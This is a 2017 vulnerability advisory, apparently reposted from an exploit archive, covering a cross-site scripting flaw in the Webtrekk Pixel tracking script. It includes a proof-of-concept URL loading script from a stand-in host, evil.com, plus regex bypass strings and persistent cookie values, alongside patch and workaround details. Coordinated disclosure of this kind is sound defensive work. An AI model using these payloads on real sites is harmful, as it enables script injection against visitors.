@@ -1,0 +1,141 @@
+id: 28818
+date: 10/18/2017
+title: Webtrekk Pixel Tracking Cross Site Scripting Vulnerability
+author: Malte Batram
+cves: 
+
+=======================================================================
+              title: Cross site scripting
+            product: Webtrekk Pixel tracking
+ vulnerable version: v3.24 to v3.40, v4.00 to v4.40, v5.00 to v5.04
+      fixed version: v3.41, v4.41, v5.05
+             impact: Medium
+           homepage: https://www.webtrekk.com/
+              found: 2017-08-29
+                 by: Malte Batram for
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Webtrekk Analytics offers an endless range of filter and analysis functions.
+Whatever type of site you operate, our analytics tools give you the raw data
+you need to dive into your web and app metrics so you can optimise your
+digital marketing campaigns."
+
+Source: https://www.webtrekk.com/en/solutions/analytics/
+
+"At home in Germany, Webtrekk ranks first among professional analytics tools
+used by the 1,000 most popular .de domains. All told, Webtrekk has a
+22.9 percent market share among providers for the top German domains,
+excluding sites that use Google Analytics or have no analytics system."
+
+Source: https://www.webtrekk.com/en/why-webtrekk/market-leader/
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult recommends to perform a thorough security review conducted by
+security professionals to identify and resolve all security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Cross site scripting vulnerability
+The Webtrekk Pixel component, used on many websites to track users, has the
+capability to load arbitrary external JavaScript via multiple parameter
+combinations. The parameters are parsed from the search-part of the URL.
+
+    ?wt_overlay=1&wt_reporter=url_for_external_javascript
+    ?wt_heatmap=1&wt_reporter=url_for_external_javascript
+
+The URL specified in the parameter wt_reporter is checked by a Regex that can
+be bypassed in different ways.
+
+
+Proof of concept:
+-----------------
+1) Cross site scripting vulnerability
+Example URL:
+    http://www.example.com/?wt_overlay=1&wt_reporter=report1.webtrekk.com.evil.com/
+
+The example URL leads to the inclusion of the following HTML in the page:
+    <script language="javascript" type="text/javascript"
+    src="https://report1.webtrekk.com.evil.com/overlay.pl?
+    wt_contentId=..."></script>
+
+Regex that checks the URL:
+    /^(http[s]?:\/\/)?(report\d+|analytics)\.webtrekk\.(com|de).*$/
+
+The .* at the end of the expression allows multiple bypasses:
+ Subdomain:  report1.webtrekk.com.evil.com/
+ Auth:       report1.webtrekk.com@evil.com/
+ NoSlash:    report1.webtrekk.com
+
+The last bypass leads to the inclusion of JavaScript from the domain
+overlay.pl, which at the time of testing was open to be registered, but has been
+registered by Webtrekk for security reasons now.
+
+The vulnerability can also be triggered via cookies. This enables an attacker
+to execute JavaScript in the session of the victim anytime the website with
+the vulnerable script is visited, after only using the parameters from the
+search once to set the cookie values.
+
+Cookie values:
+    wt_overlay=1; wt_overlayFrame=report1.webtrekk.com.evil.com/;
+
+
+Vulnerable / tested versions:
+-----------------------------
+Latest version v4.3.9 tested:
+https://support.webtrekk.com/hc/de/article_attachments/115005882469/Webtrekk_EN_Config_Pixel_v4.3.9.zip
+
+Also found to be vulnerable: 3.2.6, 4.0.5, 4.3.5
+
+The setup for version 5 is different and the static part (tiLoader.min.js)
+does not include the vulnerable JavaScript directly. However code similiar to
+the overlay functions from version 3 and 4 seems to be loaded dynamically (which
+also includes the same Regex check).
+
+According to the vendor, v5 is affected as well.
+
+
+Vendor contact timeline:
+------------------------
+2017-08-30: Contacting vendor through ask@webtrekk.com & email under "Contact",
+            no answer
+2017-09-12: Asking for contact again
+2017-09-12: Vendor: requests sending the advisory and verifies it internally
+2017-09-13: Vendor: optimized validation, fixed in internal version
+2017-09-14: Release of patched version and vendor informs their customers
+2017-10-17: Coordinated release of security advisory
+
+
+Solution:
+---------
+Upgrade to the patched versions from the vendor immediately. The following
+versions contain better domain validation and fix the issue according to
+the vendor:
+
+v3.41, v4.41, v5.05
+
+According to the vendor, the updated versions are available within the
+support center on the vendor's website for all customers and a message that
+a security update is available will be shown.
+
+
+Workaround:
+-----------
+Setting "disableOverlayView: true" in the webtrekkConfig prevents the execution
+of the vulnerable code.
+
+#  0day.today [2023-03-26]  #
